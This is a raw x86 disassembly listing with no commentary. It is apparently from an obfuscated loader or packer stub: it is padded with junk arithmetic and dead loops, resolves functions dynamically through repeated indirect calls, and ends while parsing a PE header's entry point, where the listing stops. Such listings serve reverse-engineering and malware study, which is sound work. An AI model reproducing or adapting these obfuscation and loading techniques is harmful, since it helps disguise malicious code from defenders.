  420747:	mov    eax,DWORD PTR [ebp+0x18]
  42074a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42074d:	cmp    eax,0x70941f99
  420752:	jne    0x42076b
  420758:	cmp    ecx,ebx
  42075a:	jne    0x42076b
  420760:	push   ebx
  420761:	push   0x70941f9f
  420766:	jmp    0x420786
  42076b:	mov    eax,DWORD PTR [ebp+0x18]
  42076e:	mov    ecx,DWORD PTR [ebp+0x1c]
  420771:	cmp    eax,0x70941f9f
  420776:	jne    0x420797
  42077c:	cmp    ecx,ebx
  42077e:	jne    0x420797
  420784:	push   ebx
  420785:	push   edi
  420786:	push   DWORD PTR [ebp+0x14]
  420789:	push   DWORD PTR [ebp+0x10]
  42078c:	push   DWORD PTR [ebp+0xc]
  42078f:	push   DWORD PTR [ebp+0x8]
  420792:	call   0x41b999
  420797:	pop    edi
  420798:	pop    esi
  420799:	pop    ebx
  42079a:	leave  
  42079b:	ret    0x18
  42079e:	push   ebp
  42079f:	mov    ebp,esp
  4207a1:	and    esp,0xfffffff8
  4207a4:	adc    DWORD PTR ds:0x428e9f,0x428e5f
  4207ae:	sub    esp,0xcc
  4207b4:	push   ebx
  4207b5:	push   esi
  4207b6:	adc    DWORD PTR ds:0x428ecb,0x428e7f
  4207c0:	push   edi
  4207c1:	lea    eax,[esp+0x58]
  4207c5:	push   eax
  4207c6:	mov    BYTE PTR [esp+0xda],0x0
  4207ce:	and    DWORD PTR ds:0x428e83,0x428eb7
  4207d8:	call   DWORD PTR ds:0x42a9f7
  4207de:	mov    DWORD PTR ds:0x428e9f,0x6fab
  4207e8:	mov    al,ds:0x428498
  4207ed:	cmp    al,BYTE PTR ds:0x4284a9
  4207f3:	mov    DWORD PTR ds:0x428e27,0x607e
  4207fd:	je     0x42081a
  420803:	push   0x0
  420805:	xor    DWORD PTR ds:0x428e63,0x595a
  42080f:	call   DWORD PTR ds:0x42a9b3
  420815:	jmp    0x42188d
  42081a:	mov    DWORD PTR ds:0x428e37,0x550e
  420824:	mov    al,ds:0x4284b5
  420829:	mov    DWORD PTR ds:0x428e27,0x154d
  420833:	cmp    al,BYTE PTR ds:0x4284c6
  420839:	mov    DWORD PTR ds:0x428e47,0x193
  420843:	je     0x420850
  420849:	xor    eax,eax
  42084b:	jmp    0x42188d
  420850:	mov    edi,DWORD PTR ds:0x42a9c7
  420856:	adc    DWORD PTR ds:0x428e8b,0x1314
  420860:	push   0x4284cf
  420865:	push   0x4284db
  42086a:	call   edi
  42086c:	adc    DWORD PTR ds:0x428ea3,0x428e9f
  420876:	test   eax,eax
  420878:	je     0x420849
  42087e:	and    DWORD PTR ds:0x428e6f,edx
  420884:	mov    DWORD PTR [esp+0x30],0x0
  42088c:	adc    esi,0x6be4
  420892:	mov    ecx,0xf89c85a5
  420897:	mov    DWORD PTR [esp+0x20],ecx
  42089b:	mov    ebx,DWORD PTR ds:0x428ecf
  4208a1:	add    DWORD PTR ds:0x428e8f,ebx
  4208a7:	mov    DWORD PTR [esp+0xc],0xf89c85a4
  4208af:	lea    eax,[esp+0x3c]
  4208b3:	mov    DWORD PTR [esp+0x30],eax
  4208b7:	lea    eax,[esp+0x38]
  4208bb:	mov    DWORD PTR [esp+0x18],eax
  4208bf:	mov    eax,ds:0x428373
  4208c4:	mov    ebx,DWORD PTR ds:0x428edf
  4208ca:	mov    esi,DWORD PTR ds:0x42a07b
  4208d0:	sub    esi,ebx
  4208d2:	or     ebx,DWORD PTR [ebx+esi*1]
  4208d5:	mov    eax,DWORD PTR [eax+0x1c8]
  4208db:	mov    eax,DWORD PTR [eax]
  4208dd:	and    DWORD PTR ds:0x428eaf,0x0
  4208e7:	mov    ebx,DWORD PTR ds:0x428eaf
  4208ed:	inc    ebx
  4208ee:	mov    DWORD PTR ds:0x428eaf,ebx
  4208f4:	cmp    DWORD PTR ds:0x428eaf,0x2d
  4208fb:	jle    0x42091e
  420901:	jmp    0x420911
  420906:	push   0x428189
  42090b:	call   DWORD PTR ds:0x42a9cb
  420911:	cmp    DWORD PTR ds:0x428eaf,0x1d
  420918:	jb     0x4208e7
  42091e:	mov    edx,DWORD PTR [esp+0x18]
  420922:	sub    DWORD PTR ds:0x428e37,0x428e2f
  42092c:	mov    esi,0x75108af
  420931:	and    DWORD PTR ds:0x428e5f,0x428e8b
  42093b:	xor    eax,esi
  42093d:	mov    DWORD PTR ds:0x428e53,0x1b
  420947:	cmp    DWORD PTR ds:0x428e53,0x0
  42094e:	je     0x42099d
  420954:	cmp    DWORD PTR ds:0x428e53,0x7
  42095b:	jb     0x42099d
  420961:	jmp    0x420971
  420966:	push   0x231a
  42096b:	call   DWORD PTR ds:0x42a9cf
  420971:	cmp    DWORD PTR ds:0x428e53,0x8
  420978:	jne    0x42098b
  42097e:	mov    ebx,DWORD PTR ds:0x428e53
  420984:	dec    ebx
  420985:	mov    DWORD PTR ds:0x428e53,ebx
  42098b:	mov    ebx,DWORD PTR ds:0x428e53
  420991:	dec    ebx
  420992:	mov    DWORD PTR ds:0x428e53,ebx
  420998:	jmp    0x420947
  42099d:	mov    ebx,0x3272f6
  4209a2:	add    eax,ebx
  4209a4:	mov    DWORD PTR ds:0x428ec3,0x767b
  4209ae:	mov    DWORD PTR [edx],eax
  4209b0:	mov    eax,ds:0x428cef
  4209b5:	mov    DWORD PTR ds:0x428e5f,0x7551
  4209bf:	cmp    eax,0x455dedfa
  4209c4:	mov    DWORD PTR ds:0x428e9f,0x7198
  4209ce:	jne    0x420a43
  4209d4:	or     DWORD PTR ds:0x428e3b,edi
  4209da:	mov    eax,DWORD PTR [esp+0x20]
  4209de:	mov    edx,DWORD PTR ds:0x428373
  4209e4:	mov    DWORD PTR ds:0x428e63,0x33b4
  4209ee:	mov    edx,DWORD PTR [edx+0x198]
  4209f4:	xor    eax,esi
  4209f6:	inc    DWORD PTR ds:0x428e6b
  4209fc:	add    eax,ebx
  4209fe:	mov    DWORD PTR [edx],eax
  420a00:	mov    eax,DWORD PTR [esp+0x20]
  420a04:	xor    DWORD PTR ds:0x428e57,0x1a38
  420a0e:	xor    eax,esi
  420a10:	add    eax,ebx
  420a12:	adc    DWORD PTR ds:0x428e23,0x304d
  420a1c:	mov    ds:0x428cef,eax
  420a21:	and    eax,0x47de
  420a26:	mov    eax,DWORD PTR [esp+0x20]
  420a2a:	adc    DWORD PTR ds:0x428e9b,0x428e27
  420a34:	xor    eax,esi
  420a36:	add    eax,ebx
  420a38:	inc    DWORD PTR ds:0x428ebb
  420a3e:	mov    ds:0x42846b,eax
  420a43:	and    DWORD PTR ds:0x428e43,0x0
  420a4d:	mov    eax,ds:0x428e43
  420a52:	inc    eax
  420a53:	mov    ds:0x428e43,eax
  420a58:	cmp    DWORD PTR ds:0x428e43,0x28
  420a5f:	ja     0x420a82
  420a65:	jmp    0x420a75
  420a6a:	push   0x42815b
  420a6f:	call   DWORD PTR ds:0x42a9d3
  420a75:	cmp    DWORD PTR ds:0x428e43,0x1e
  420a7c:	jb     0x420a4d
  420a82:	mov    eax,ds:0x428373
  420a87:	adc    DWORD PTR ds:0x428e9f,0x428e87
  420a91:	mov    eax,DWORD PTR [eax+0x18c]
  420a97:	mov    eax,DWORD PTR [eax]
  420a99:	mov    DWORD PTR [esp+0x40],eax
  420a9d:	mov    eax,0xf89c85a1
  420aa2:	add    DWORD PTR ds:0x428ec3,0x428e3f
  420aac:	mov    DWORD PTR [esp+0x10],eax
  420ab0:	sub    DWORD PTR ds:0x428eab,0x428e2f
  420aba:	mov    DWORD PTR [esp+0x10],eax
  420abe:	and    DWORD PTR ds:0x428e97,0x428e8f
  420ac8:	mov    DWORD PTR [esp+0x10],eax
  420acc:	sub    DWORD PTR ds:0x428e9f,0x428e8f
  420ad6:	mov    DWORD PTR [esp+0x10],ecx
  420ada:	add    DWORD PTR ds:0x428e5b,0x398e
  420ae4:	mov    DWORD PTR [esp+0x18],eax
  420ae8:	adc    DWORD PTR ds:0x428ecb,0x1d27
  420af2:	mov    DWORD PTR [esp+0x18],0xf89c85bd
  420afa:	add    DWORD PTR ds:0x428e83,edi
  420b00:	mov    eax,DWORD PTR [esp+0x20]
  420b04:	sbb    DWORD PTR ds:0x428e5b,0x428ebf
  420b0e:	xor    eax,esi
  420b10:	or     DWORD PTR ds:0x428ebb,0x428e7f
  420b1a:	add    eax,ebx
  420b1c:	mov    DWORD PTR ds:0x428e37,0x4b61
  420b26:	jmp    0x420d1e
  420b2b:	mov    DWORD PTR ds:0x428ea7,0x2827
  420b35:	mov    al,ds:0x4284e8
  420b3a:	mov    DWORD PTR ds:0x428ecb,0x2eff
  420b44:	cmp    al,BYTE PTR ds:0x4284f9
  420b4a:	jne    0x420849
  420b50:	mov    DWORD PTR ds:0x428e3f,0x3779
  420b5a:	mov    al,ds:0x428505
  420b5f:	mov    DWORD PTR ds:0x428e67,0xc1e
  420b69:	cmp    al,BYTE PTR ds:0x428516
  420b6f:	jne    0x420849
  420b75:	or     DWORD PTR ds:0x428e53,0x428ec3
  420b7f:	push   0x42851f
  420b84:	or     DWORD PTR ds:0x428eb7,0x428ebb
  420b8e:	push   0x42852b
  420b93:	sub    DWORD PTR ds:0x428e9f,0x10e
  420b9d:	call   edi
  420b9f:	xor    DWORD PTR ds:0x428e93,0x265a
  420ba9:	test   eax,eax
  420bab:	je     0x420849
  420bb1:	mov    al,ds:0x428538
  420bb6:	mov    DWORD PTR ds:0x428e5f,0x67be
  420bc0:	cmp    al,BYTE PTR ds:0x428549
  420bc6:	mov    DWORD PTR ds:0x428ecb,0x75a8
  420bd0:	jne    0x420849
  420bd6:	mov    DWORD PTR ds:0x428e6f,0x3bcf
  420be0:	mov    al,ds:0x428555
  420be5:	mov    DWORD PTR ds:0x428e6b,0x562a
  420bef:	cmp    al,BYTE PTR ds:0x428566
  420bf5:	jne    0x420849
  420bfb:	adc    DWORD PTR ds:0x428e2f,0x428ec3
  420c05:	push   0x42856f
  420c0a:	add    DWORD PTR ds:0x428ecb,0x428e87
  420c14:	push   0x42857b
  420c19:	call   edi
  420c1b:	and    DWORD PTR ds:0x428e6b,0x4f9f
  420c25:	test   eax,eax
  420c27:	je     0x420849
  420c2d:	sub    eax,DWORD PTR ds:0x428e9b
  420c33:	mov    eax,DWORD PTR [esp+0xc]
  420c37:	mov    ecx,DWORD PTR [esp+0x18]
  420c3b:	add    DWORD PTR ds:0x428e93,0x1aa1
  420c45:	xor    eax,esi
  420c47:	lea    eax,[eax+ecx*1+0x3272f6]
  420c4e:	and    DWORD PTR ds:0x428e5f,0x6940
  420c58:	push   eax
  420c59:	or     eax,DWORD PTR ds:0x428e5b
  420c5f:	mov    eax,DWORD PTR [esp+0x14]
  420c63:	xor    eax,esi
  420c65:	or     DWORD PTR ds:0x428e77,0x428e6f
  420c6f:	lea    eax,[ebp+eax*1+0x3272fe]
  420c76:	adc    DWORD PTR ds:0x428eb7,0x2832
  420c80:	push   eax
  420c81:	mov    eax,ds:0x428373
  420c86:	push   DWORD PTR [eax+0x1bc]
  420c8c:	sbb    DWORD PTR ds:0x428eb7,0x428ebb
  420c96:	call   0x421896
  420c9b:	mov    eax,DWORD PTR [esp+0xc]
  420c9f:	mov    edx,DWORD PTR ds:0x428e9f
  420ca5:	or     edx,DWORD PTR ds:0x428e7b
  420cab:	mov    DWORD PTR ds:0x428e9f,edx
  420cb1:	mov    ecx,DWORD PTR [esp+0x18]
  420cb5:	mov    DWORD PTR ds:0x428e9f,0x15
  420cbf:	cmp    DWORD PTR ds:0x428e9f,0x0
  420cc6:	je     0x420d15
  420ccc:	cmp    DWORD PTR ds:0x428e9f,0x5
  420cd3:	jle    0x420d15
  420cd9:	jmp    0x420ce9
  420cde:	push   0x75d1
  420ce3:	call   DWORD PTR ds:0x42a9d7
  420ce9:	cmp    DWORD PTR ds:0x428e9f,0x6
  420cf0:	jne    0x420d03
  420cf6:	mov    edx,DWORD PTR ds:0x428e9f
  420cfc:	dec    edx
  420cfd:	mov    DWORD PTR ds:0x428e9f,edx
  420d03:	mov    edx,DWORD PTR ds:0x428e9f
  420d09:	dec    edx
  420d0a:	mov    DWORD PTR ds:0x428e9f,edx
  420d10:	jmp    0x420cbf
  420d15:	xor    eax,esi
  420d17:	lea    eax,[ecx+eax*1+0x3272f6]
  420d1e:	and    DWORD PTR ds:0x428ea3,0x0
  420d28:	jmp    0x420d3c
  420d2d:	xor    ecx,ecx
  420d2f:	add    ecx,DWORD PTR ds:0x428ea3
  420d35:	inc    ecx
  420d36:	mov    DWORD PTR ds:0x428ea3,ecx
  420d3c:	cmp    DWORD PTR ds:0x428ea3,0x1b
  420d43:	jae    0x420d83
  420d49:	cmp    DWORD PTR ds:0x428ea3,0x4
  420d50:	jle    0x420d83
  420d56:	jmp    0x420d64
  420d5b:	push   DWORD PTR [ebp-0x18]
  420d5e:	call   DWORD PTR ds:0x42a9db
  420d64:	cmp    DWORD PTR ds:0x428ea3,0x3
  420d6b:	jne    0x420d7e
  420d71:	mov    ecx,DWORD PTR ds:0x428ea3
  420d77:	inc    ecx
  420d78:	mov    DWORD PTR ds:0x428ea3,ecx
  420d7e:	jmp    0x420d2d
  420d83:	mov    ecx,DWORD PTR [esp+0xc]
  420d87:	mov    edx,DWORD PTR [esp+0xc]
  420d8b:	and    DWORD PTR ds:0x428e7f,0x27c9
  420d95:	xor    edx,esi
  420d97:	xor    ecx,esi
  420d99:	add    ecx,edx
  420d9b:	and    DWORD PTR ds:0x428eb7,0x0
  420da5:	mov    edx,DWORD PTR ds:0x428eb7
  420dab:	inc    edx
  420dac:	mov    DWORD PTR ds:0x428eb7,edx
  420db2:	cmp    DWORD PTR ds:0x428eb7,0x23
  420db9:	jg     0x420de1
  420dbf:	jmp    0x420dd4
  420dc4:	push   0x428e3f
  420dc9:	push   0x584f
  420dce:	call   DWORD PTR ds:0x42a9df
  420dd4:	cmp    DWORD PTR ds:0x428eb7,0x1b
  420ddb:	jb     0x420da5
  420de1:	mov    edx,DWORD PTR [esp+0xc]
  420de5:	mov    DWORD PTR ds:0x428e97,0x4e1f
  420def:	xor    edx,esi
  420df1:	lea    ecx,[ecx+edx*1+0x9758e2]
  420df8:	mov    DWORD PTR ds:0x428e83,0x69c
  420e02:	mov    DWORD PTR [esp+0x18],eax
  420e06:	mov    DWORD PTR ds:0x428ebf,0x5f48
  420e10:	cmp    eax,ecx
  420e12:	mov    DWORD PTR ds:0x428e3f,0x5aa0
  420e1c:	jbe    0x420b2b
  420e22:	not    eax
  420e24:	mov    eax,DWORD PTR [ebp+0xc]
  420e27:	and    ecx,0x5ce1
  420e2d:	mov    ds:0x4281f7,eax
  420e32:	mov    eax,DWORD PTR [ebp+0x10]
  420e35:	mov    DWORD PTR ds:0x428e87,0x15
  420e3f:	cmp    DWORD PTR ds:0x428e87,0x0
  420e46:	je     0x420e96
  420e4c:	cmp    DWORD PTR ds:0x428e87,0x6
  420e53:	jb     0x420e96
  420e59:	jmp    0x420e6a
  420e5e:	push   DWORD PTR [ebp-0x14]
  420e61:	push   DWORD PTR [ebp-0x1c]
  420e64:	call   DWORD PTR ds:0x42a9e3
  420e6a:	cmp    DWORD PTR ds:0x428e87,0x7
  420e71:	jne    0x420e84
  420e77:	mov    ecx,DWORD PTR ds:0x428e87
  420e7d:	dec    ecx
  420e7e:	mov    DWORD PTR ds:0x428e87,ecx
  420e84:	mov    ecx,DWORD PTR ds:0x428e87
  420e8a:	dec    ecx
  420e8b:	mov    DWORD PTR ds:0x428e87,ecx
  420e91:	jmp    0x420e3f
  420e96:	mov    ds:0x428453,eax
  420e9b:	mov    eax,ds:0x4281f7
  420ea0:	mov    ecx,DWORD PTR ds:0x428e9b
  420ea6:	adc    ecx,DWORD PTR ds:0x428ec3
  420eac:	mov    DWORD PTR ds:0x428e9b,ecx
  420eb2:	mov    ecx,DWORD PTR [esp+0x30]
  420eb6:	sub    eax,ebx
  420eb8:	xor    eax,esi
  420eba:	mov    DWORD PTR ds:0x428ecb,0x2418
  420ec4:	mov    DWORD PTR [ecx],eax
  420ec6:	mov    DWORD PTR ds:0x428e97,0x6c0e
  420ed0:	lea    eax,[esp+0x2c]
  420ed4:	mov    DWORD PTR [esp+0x44],eax
  420ed8:	mov    DWORD PTR ds:0x428ea3,0x17d
  420ee2:	lea    eax,[ebp+0x4]
  420ee5:	mov    DWORD PTR [esp+0x2c],eax
  420ee9:	mov    DWORD PTR ds:0x428ec3,0x4441
  420ef3:	mov    al,ds:0x428588
  420ef8:	cmp    al,BYTE PTR ds:0x428599
  420efe:	mov    DWORD PTR ds:0x428e47,0x46bb
  420f08:	jne    0x420849
  420f0e:	mov    al,ds:0x4285a5
  420f13:	cmp    al,BYTE PTR ds:0x4285b6
  420f19:	mov    DWORD PTR ds:0x428eaf,0x61de
  420f23:	jne    0x420849
  420f29:	mov    DWORD PTR ds:0x428ea7,0xc38
  420f33:	push   0x4285bf
  420f38:	sbb    DWORD PTR ds:0x428e8b,0x428e7f
  420f42:	push   0x4285cb
  420f47:	call   edi
  420f49:	test   eax,eax
  420f4b:	mov    DWORD PTR ds:0x428e4b,0x74a1
  420f55:	je     0x420849
  420f5b:	mov    al,ds:0x4285d8
  420f60:	mov    DWORD PTR ds:0x428e27,0x62c3
  420f6a:	cmp    al,BYTE PTR ds:0x4285e9
  420f70:	jne    0x420849
  420f76:	mov    DWORD PTR ds:0x428e5b,0x5f7d
  420f80:	mov    al,ds:0x4285f5
  420f85:	mov    DWORD PTR ds:0x428e3b,0x1797
  420f8f:	cmp    al,BYTE PTR ds:0x428606
  420f95:	jne    0x420849
  420f9b:	push   0x42860f
  420fa0:	add    DWORD PTR ds:0x428ebf,0x428eab
  420faa:	push   0x42861b
  420faf:	call   edi
  420fb1:	test   eax,eax
  420fb3:	je     0x420849
  420fb9:	mov    DWORD PTR ds:0x428e67,0x333a
  420fc3:	mov    al,ds:0x428628
  420fc8:	cmp    al,BYTE PTR ds:0x428639
  420fce:	jne    0x420849
  420fd4:	mov    DWORD PTR ds:0x428e63,0x2ea7
  420fde:	mov    al,ds:0x428645
  420fe3:	mov    DWORD PTR ds:0x428e83,0x19a
  420fed:	cmp    al,BYTE PTR ds:0x428656
  420ff3:	mov    DWORD PTR ds:0x428ec3,0xb46
  420ffd:	jne    0x420849
  421003:	xor    DWORD PTR ds:0x428e4b,0x428e9b
  42100d:	push   0x42865f
  421012:	xor    DWORD PTR ds:0x428ea7,0x428ebf
  42101c:	push   0x42866b
  421021:	adc    DWORD PTR ds:0x428e7b,0x428e97
  42102b:	call   edi
  42102d:	test   eax,eax
  42102f:	je     0x420849
  421035:	mov    DWORD PTR ds:0x428eab,0x160c
  42103f:	mov    al,ds:0x428678
  421044:	cmp    al,BYTE PTR ds:0x428689
  42104a:	mov    DWORD PTR ds:0x428e33,0x7fda
  421054:	jne    0x420849
  42105a:	mov    DWORD PTR ds:0x428eb3,0x205
  421064:	mov    al,ds:0x428695
  421069:	mov    DWORD PTR ds:0x428ea7,0x1bc1
  421073:	cmp    al,BYTE PTR ds:0x4286a6
  421079:	mov    DWORD PTR ds:0x428e2f,0xcbc
  421083:	jne    0x420849
  421089:	push   0x4286af
  42108e:	xor    DWORD PTR ds:0x428e73,0x428e53
  421098:	push   0x4286bb
  42109d:	call   edi
  42109f:	test   eax,eax
  4210a1:	mov    DWORD PTR ds:0x428e7f,0x3ee2
  4210ab:	je     0x420849
  4210b1:	mov    DWORD PTR ds:0x428e73,0x4aa5
  4210bb:	mov    al,ds:0x4286c8
  4210c0:	mov    DWORD PTR ds:0x428e73,0x2576
  4210ca:	cmp    al,BYTE PTR ds:0x4286d9
  4210d0:	jne    0x420849
  4210d6:	mov    al,ds:0x4286e5
  4210db:	mov    DWORD PTR ds:0x428eab,0x2fd2
  4210e5:	cmp    al,BYTE PTR ds:0x4286f6
  4210eb:	mov    DWORD PTR ds:0x428e77,0x665f
  4210f5:	jne    0x420849
  4210fb:	push   0x4286ff
  421100:	xor    DWORD PTR ds:0x428eab,0x43e0
  42110a:	push   0x42870b
  42110f:	call   edi
  421111:	add    DWORD PTR ds:0x428eaf,0x428e77
  42111b:	test   eax,eax
  42111d:	mov    DWORD PTR ds:0x428e7f,0x618e
  421127:	je     0x420849
  42112d:	mov    al,ds:0x428718
  421132:	mov    DWORD PTR ds:0x428ebb,0x5321
  42113c:	cmp    al,BYTE PTR ds:0x428729
  421142:	jne    0x420849
  421148:	mov    al,ds:0x428735
  42114d:	cmp    al,BYTE PTR ds:0x428746
  421153:	jne    0x420849
  421159:	adc    DWORD PTR ds:0x428ea7,0x4891
  421163:	push   0x42874f
  421168:	xor    DWORD PTR ds:0x428ecb,0x428ec3
  421172:	push   0x42875b
  421177:	call   edi
  421179:	xor    DWORD PTR ds:0x428ecb,0x428e67
  421183:	test   eax,eax
  421185:	mov    DWORD PTR ds:0x428e77,0x34d8
  42118f:	je     0x420849
  421195:	mov    DWORD PTR ds:0x428e63,0x47d8
  42119f:	mov    al,ds:0x428768
  4211a4:	mov    DWORD PTR ds:0x428ebb,0x60f8
  4211ae:	cmp    al,BYTE PTR ds:0x428779
  4211b4:	mov    DWORD PTR ds:0x428e63,0x352f
  4211be:	jne    0x420849
  4211c4:	mov    al,ds:0x428785
  4211c9:	mov    DWORD PTR ds:0x428e37,0x65de
  4211d3:	cmp    al,BYTE PTR ds:0x428796
  4211d9:	mov    DWORD PTR ds:0x428e3f,0x2ba7
  4211e3:	jne    0x420849
  4211e9:	push   0x42879f
  4211ee:	sbb    DWORD PTR ds:0x428e6b,0x25d3
  4211f8:	push   0x4287ab
  4211fd:	call   edi
  4211ff:	adc    DWORD PTR ds:0x428ebf,0x428ea3
  421209:	test   eax,eax
  42120b:	mov    DWORD PTR ds:0x428e6f,0x1c88
  421215:	je     0x420849
  42121b:	not    DWORD PTR ds:0x428e63
  421221:	mov    al,ds:0x4287b8
  421226:	cmp    al,BYTE PTR ds:0x4287c9
  42122c:	jne    0x420849
  421232:	mov    al,ds:0x4287d5
  421237:	mov    DWORD PTR ds:0x428e7b,0x5e30
  421241:	cmp    al,BYTE PTR ds:0x4287e6
  421247:	mov    DWORD PTR ds:0x428e9b,0x700f
  421251:	jne    0x420849
  421257:	or     DWORD PTR ds:0x428e83,0x99a
  421261:	push   0x4287ef
  421266:	adc    DWORD PTR ds:0x428e9f,0x22ee
  421270:	push   0x4287fb
  421275:	adc    DWORD PTR ds:0x428ecb,0x428ec3
  42127f:	call   edi
  421281:	sub    DWORD PTR ds:0x428e43,0x72f1
  42128b:	test   eax,eax
  42128d:	je     0x420849
  421293:	mov    DWORD PTR ds:0x428e57,0x70e
  42129d:	mov    al,ds:0x428808
  4212a2:	cmp    al,BYTE PTR ds:0x428819
  4212a8:	jne    0x420849
  4212ae:	mov    al,ds:0x428825
  4212b3:	mov    DWORD PTR ds:0x428ea3,0x4a62
  4212bd:	cmp    al,BYTE PTR ds:0x428836
  4212c3:	mov    DWORD PTR ds:0x428ea7,0x4507
  4212cd:	jne    0x420849
  4212d3:	sbb    DWORD PTR ds:0x428e23,0x428e6f
  4212dd:	push   0x42883f
  4212e2:	xor    DWORD PTR ds:0x428e2b,0x428e87
  4212ec:	push   0x42884b
  4212f1:	or     DWORD PTR ds:0x428e8f,0x428e6b
  4212fb:	call   edi
  4212fd:	test   eax,eax
  4212ff:	mov    DWORD PTR ds:0x428ec7,0x3c0e
  421309:	je     0x420849
  42130f:	mov    DWORD PTR ds:0x428e2f,0x1c83
  421319:	mov    al,ds:0x428858
  42131e:	cmp    al,BYTE PTR ds:0x428869
  421324:	jne    0x420849
  42132a:	mov    al,ds:0x428875
  42132f:	mov    DWORD PTR ds:0x428eab,0x7836
  421339:	cmp    al,BYTE PTR ds:0x428886
  42133f:	mov    DWORD PTR ds:0x428e33,0x5d16
  421349:	jne    0x420849
  42134f:	push   0x42888f
  421354:	or     DWORD PTR ds:0x428e6f,0x428e43
  42135e:	push   0x42889b
  421363:	adc    DWORD PTR ds:0x428e6f,0x64ad
  42136d:	call   edi
  42136f:	and    DWORD PTR ds:0x428e93,0x428eb3
  421379:	test   eax,eax
  42137b:	je     0x420849
  421381:	mov    al,ds:0x4288a8
  421386:	cmp    al,BYTE PTR ds:0x4288b9
  42138c:	mov    DWORD PTR ds:0x428e2b,0x5e8c
  421396:	jne    0x420849
  42139c:	mov    DWORD PTR ds:0x428ea3,0x4898
  4213a6:	mov    al,ds:0x4288c5
  4213ab:	cmp    al,BYTE PTR ds:0x4288d6
  4213b1:	jne    0x420849
  4213b7:	push   0x4288df
  4213bc:	push   0x4288eb
  4213c1:	call   edi
  4213c3:	test   eax,eax
  4213c5:	mov    DWORD PTR ds:0x428ebb,0xe84
  4213cf:	je     0x420849
  4213d5:	mov    al,ds:0x4288f8
  4213da:	cmp    al,BYTE PTR ds:0x428909
  4213e0:	mov    DWORD PTR ds:0x428e3b,0x418e
  4213ea:	jne    0x420849
  4213f0:	mov    DWORD PTR ds:0x428e5b,0x25d1
  4213fa:	mov    al,ds:0x428915
  4213ff:	cmp    al,BYTE PTR ds:0x428926
  421405:	mov    DWORD PTR ds:0x428e6b,0x4b5f
  42140f:	jne    0x420849
  421415:	push   0x42892f
  42141a:	adc    DWORD PTR ds:0x428ec7,0x4db7
  421424:	push   0x42893b
  421429:	sbb    DWORD PTR ds:0x428e6b,0x428ebf
  421433:	call   edi
  421435:	sub    DWORD PTR ds:0x428e33,0x428e97
  42143f:	test   eax,eax
  421441:	mov    DWORD PTR ds:0x428ec7,0x19ef
  42144b:	je     0x420849
  421451:	mov    al,ds:0x428948
  421456:	cmp    al,BYTE PTR ds:0x428959
  42145c:	jne    0x420849
  421462:	mov    al,ds:0x428965
  421467:	cmp    al,BYTE PTR ds:0x428976
  42146d:	jne    0x420849
  421473:	push   0x42897f
  421478:	push   0x42898b
  42147d:	call   edi
  42147f:	test   eax,eax
  421481:	je     0x420849
  421487:	mov    al,ds:0x428998
  42148c:	cmp    al,BYTE PTR ds:0x4289a9
  421492:	jne    0x420849
  421498:	mov    al,ds:0x4289b5
  42149d:	cmp    al,BYTE PTR ds:0x4289c6
  4214a3:	jne    0x420849
  4214a9:	push   0x4289cf
  4214ae:	push   0x4289db
  4214b3:	call   edi
  4214b5:	test   eax,eax
  4214b7:	je     0x420849
  4214bd:	mov    al,ds:0x4289e8
  4214c2:	cmp    al,BYTE PTR ds:0x4289f9
  4214c8:	jne    0x420849
  4214ce:	mov    al,ds:0x428a05
  4214d3:	cmp    al,BYTE PTR ds:0x428a16
  4214d9:	jne    0x420849
  4214df:	push   0x428a1f
  4214e4:	push   0x428a2b
  4214e9:	call   edi
  4214eb:	test   eax,eax
  4214ed:	je     0x420849
  4214f3:	mov    al,ds:0x428a38
  4214f8:	cmp    al,BYTE PTR ds:0x428a49
  4214fe:	jne    0x420849
  421504:	mov    al,ds:0x428a55
  421509:	cmp    al,BYTE PTR ds:0x428a66
  42150f:	jne    0x420849
  421515:	push   0x428a6f
  42151a:	push   0x428a7b
  42151f:	call   edi
  421521:	test   eax,eax
  421523:	je     0x420849
  421529:	mov    al,ds:0x428a88
  42152e:	cmp    al,BYTE PTR ds:0x428a99
  421534:	jne    0x420849
  42153a:	mov    al,ds:0x428aa5
  42153f:	cmp    al,BYTE PTR ds:0x428ab6
  421545:	jne    0x420849
  42154b:	push   0x428abf
  421550:	push   0x428acb
  421555:	call   edi
  421557:	test   eax,eax
  421559:	je     0x420849
  42155f:	mov    al,ds:0x428ad8
  421564:	cmp    al,BYTE PTR ds:0x428ae9
  42156a:	jne    0x420849
  421570:	mov    al,ds:0x428af5
  421575:	cmp    al,BYTE PTR ds:0x428b06
  42157b:	jne    0x420849
  421581:	push   0x428b0f
  421586:	push   0x428b1b
  42158b:	call   edi
  42158d:	test   eax,eax
  42158f:	je     0x420849
  421595:	mov    al,ds:0x428b28
  42159a:	cmp    al,BYTE PTR ds:0x428b39
  4215a0:	jne    0x420849
  4215a6:	mov    al,ds:0x428b45
  4215ab:	cmp    al,BYTE PTR ds:0x428b56
  4215b1:	jne    0x420849
  4215b7:	push   0x428b5f
  4215bc:	push   0x428b6b
  4215c1:	call   edi
  4215c3:	test   eax,eax
  4215c5:	je     0x420849
  4215cb:	mov    al,ds:0x428b78
  4215d0:	cmp    al,BYTE PTR ds:0x428b89
  4215d6:	jne    0x420849
  4215dc:	mov    al,ds:0x428b95
  4215e1:	cmp    al,BYTE PTR ds:0x428ba6
  4215e7:	jne    0x420849
  4215ed:	push   0x428baf
  4215f2:	push   0x428bbb
  4215f7:	call   edi
  4215f9:	test   eax,eax
  4215fb:	je     0x420849
  421601:	mov    al,ds:0x428bc8
  421606:	cmp    al,BYTE PTR ds:0x428bd9
  42160c:	jne    0x420849
  421612:	mov    al,ds:0x428be5
  421617:	cmp    al,BYTE PTR ds:0x428bf6
  42161d:	jne    0x420849
  421623:	push   0x428bff
  421628:	push   0x428c0b
  42162d:	call   edi
  42162f:	test   eax,eax
  421631:	je     0x420849
  421637:	mov    eax,DWORD PTR [esp+0x3c]
  42163b:	cmp    eax,0xf89c85a4
  421640:	je     0x42169f
  421646:	mov    eax,DWORD PTR [esp+0x20]
  42164a:	mov    ecx,DWORD PTR [esp+0x38]
  42164e:	xor    eax,esi
  421650:	add    eax,ebx
  421652:	cmp    eax,ecx
  421654:	je     0x42169f
  42165a:	mov    eax,ds:0x428373
  42165f:	mov    eax,DWORD PTR [eax+0x194]
  421665:	mov    ecx,DWORD PTR [eax]
  421667:	mov    eax,DWORD PTR [ecx+0x3c]
  42166a:	push   DWORD PTR ds:0x428453
  421670:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  421674:	push   DWORD PTR ds:0x4281f7
  42167a:	add    eax,ecx
  42167c:	mov    ecx,DWORD PTR ds:0x428373
